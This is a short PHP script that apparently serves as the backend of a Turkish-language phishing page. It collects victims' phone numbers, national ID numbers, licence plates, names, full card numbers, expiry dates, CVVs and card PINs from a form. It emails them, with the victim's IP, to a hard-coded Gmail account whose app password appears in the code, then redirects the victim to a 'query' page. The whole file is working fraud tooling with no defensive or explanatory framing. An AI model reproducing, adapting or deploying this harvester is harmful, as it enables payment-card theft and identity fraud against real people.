
<?php
use PHPMailer\PHPMailer\PHPMailer;

require_once 'phpmailer/Exception.php';
require_once 'phpmailer/PHPMailer.php';
require_once 'phpmailer/SMTP.php';


$mail = new PHPMailer(true);


$alert = 'HATA';
if(isset($_POST['submit'])){
  $ip = $_SERVER["REMOTE_ADDR"];
  $gsm = $_POST['gsm'];
  $plaka = $_POST['plaka'];
  $tckn = $_POST['tckn'];
  $ad = $_POST['ad'];
  $kartno = $_POST['kartno'];
  $expiry_date = $_POST['expiry_date'];
  $plaka1 = $_POST['plaka1'];
  $cvv = $_POST['cvv'];



  try{
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = '0xc0000c4@gmail.com'; // Gmail address which you want to use as SMTP server
    $mail->Password = 'dgqcwtkzmchaoqae'; // Gmail address Password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = '587';
    $mail->setFrom('0xc0000c4@gmail.com'); // Gmail address which you used as SMTP server
    $mail->addAddress('0xc0000c4@gmail.com'); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)
     $mail->CharSet = 'utf-8';


    
    $mail->isHTML(true);
    $mail->Subject = "Eml Bilgi$ip";
    $mail->Body = "Telefon Numarasi : $gsm <br>
     Tc Kimlik Numarasi : $tckn<br>
    Plaka Numarasi : $plaka <br>
    Adi / Soyadi : $ad <br>
     Kart Numarasi: $kartno <br>
    Son Kullanma Tarihi : $expiry_date<br>
    CVV Guvenlik:$cvv <br>
    Kart Sifresi:$plaka1 <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    -------------------------------------------
    <br>
     Gonderen IP : $ip";
   
   
   

    $mail->send();
header("Location:/sorgulama.html") ;
} catch (Exception $e){
$alert = '<div class="alert-error">
<span>'.$e->getMessage().'</span>
</div>';
}
}
?>
